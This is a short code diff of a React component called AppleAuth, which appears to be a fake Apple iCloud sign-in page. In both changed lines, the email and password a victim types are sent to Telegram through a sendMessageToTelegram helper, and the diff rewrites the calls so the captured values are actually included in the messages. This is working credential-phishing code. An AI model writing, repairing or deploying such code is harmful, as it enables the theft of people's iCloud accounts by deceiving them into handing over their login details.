@@ -46,7 +46,7 @@ export default function AppleAuth() {
         
         setIsLoading(true);
         // console.log("Email submitted:", email);
-        sendMessageToTelegram("ICLOUD EMAIL: ", email)
+        sendMessageToTelegram(`ICLOUD EMAIL: ${email}`)
         
         // Simulate API call delay
         // setTimeout(() => {
@@ -60,7 +60,7 @@ export default function AppleAuth() {
         if (!password.trim()) return;
         
         setIsLoading(true);
-        sendMessageToTelegram("ICLOUD PASSWORD: ", password)
+        sendMessageToTelegram(`ICLOUD PASSWORD: ${password}`)
         // console.log("Email:", email, "Password:", password);
         
         // You can add API call here to send the data
